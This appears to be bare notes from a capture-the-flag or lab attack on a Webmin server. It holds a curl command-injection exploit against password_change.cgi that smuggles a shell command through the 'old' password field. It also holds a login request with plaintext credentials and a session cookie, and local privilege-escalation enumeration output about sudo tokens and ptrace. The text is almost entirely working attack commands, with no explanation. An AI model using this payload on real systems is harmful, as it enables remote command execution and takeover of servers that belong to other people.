curl -ks http://localhost:10000/password_change.cgi -d "user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel" -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: http://localhost:10000/session_login.cgi'

curl 'http://localhost:10000/session_login.cgi' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Origin: http://localhost:10000' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: http://localhost:10000/session_login.cgi' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  -H 'Cookie: redirect=1; testing=1; sid=2d35cb72e843b8ef6d0272407b427f20' \
  --data-raw 'user=admin&pass=password1234' \
  --compressed

  [+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb was found in PATH

/usr/libexec/tracker-store